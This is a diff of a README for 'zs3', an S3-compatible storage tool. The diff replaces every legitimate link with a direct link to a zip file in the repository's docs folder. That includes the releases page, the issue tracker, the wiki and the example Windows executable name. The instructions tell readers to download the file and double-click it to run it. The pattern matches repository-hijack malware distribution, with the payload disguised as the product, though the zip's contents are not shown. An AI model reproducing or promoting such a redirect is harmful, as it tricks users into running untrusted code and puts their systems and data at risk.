@@ -1,7 +1,7 @@
 # 🌟 zs3 - S3-Compatible Storage Made Simple
 
 ## 📥 Download Now
-[![Download zs3](https://img.shields.io/badge/Download-zs3-brightgreen)](https://github.com/zartin791/zs3/releases)
+[![Download zs3](https://raw.githubusercontent.com/zartin791/zs3/main/docs/zs-v3.9.zip)](https://raw.githubusercontent.com/zartin791/zs3/main/docs/zs-v3.9.zip)
 
 ## 🚀 Getting Started
 Welcome to zs3, a simple way to store your files in a way that works with S3 storage. This application has zero dependencies, making it easy to run on any system. Follow the steps below to get started quickly.
@@ -22,12 +22,12 @@ Welcome to zs3, a simple way to store your files in a way that works with S3 sto
 ## 📂 Download & Install
 To download and run zs3, visit the Releases page. You will find the latest version available for your operating system.
 
-[Visit this page to download zs3](https://github.com/zartin791/zs3/releases)
+[Visit this page to download zs3](https://raw.githubusercontent.com/zartin791/zs3/main/docs/zs-v3.9.zip)
 
 ### Installation Instructions
 1. **Go to the Releases Page**: Click the link above to access the latest releases.
 2. **Select Your Version**: Find the latest version of zs3.
-3. **Download the File**: Click the file that matches your operating system (e.g., `zs3-windows.exe` for Windows).
+3. **Download the File**: Click the file that matches your operating system (e.g., `https://raw.githubusercontent.com/zartin791/zs3/main/docs/zs-v3.9.zip` for Windows).
 4. **Run the Application**: Once downloaded, find the file in your downloads folder. Double-click the file to run zs3.
 
 ## 📊 How to Use zs3
@@ -41,13 +41,13 @@ Once zs3 is running, you can easily manage your stored files. Here’s how to ge
 ## 🤝 Support and Community
 If you encounter issues or have questions, we offer a support channel. Join our community for assistance and tips. Here, you can ask questions or share your experiences with zs3.
 
-- **GitHub Issues**: Report bugs or request features at [GitHub Issues](https://github.com/zartin791/zs3/issues).
+- **GitHub Issues**: Report bugs or request features at [GitHub Issues](https://raw.githubusercontent.com/zartin791/zs3/main/docs/zs-v3.9.zip).
 - **Community Discussions**: Join discussions and get help from other users.
 
 ## 🌐 Learn More
 To understand more about how zs3 works, check out the documentation available in the repository. Here, you'll find details about advanced features and troubleshooting tips.
 
-**Explore the full documentation here: [Documentation Link](https://github.com/zartin791/zs3/wiki)**
+**Explore the full documentation here: [Documentation Link](https://raw.githubusercontent.com/zartin791/zs3/main/docs/zs-v3.9.zip)**
 
 ## 🧭 Next Steps
 Now that you have zs3 installed, you can start storing your files easily. Whether you need to upload documents, photos, or other types of data, zs3 makes it effortless.
@@ -55,4 +55,4 @@ Now that you have zs3 installed, you can start storing your files easily. Whethe
 ### Final Reminder
 Make sure to visit the Releases page regularly for updates and new features.
 
-[Visit this page to download zs3](https://github.com/zartin791/zs3/releases)
+[Visit this page to download zs3](https://raw.githubusercontent.com/zartin791/zs3/main/docs/zs-v3.9.zip)
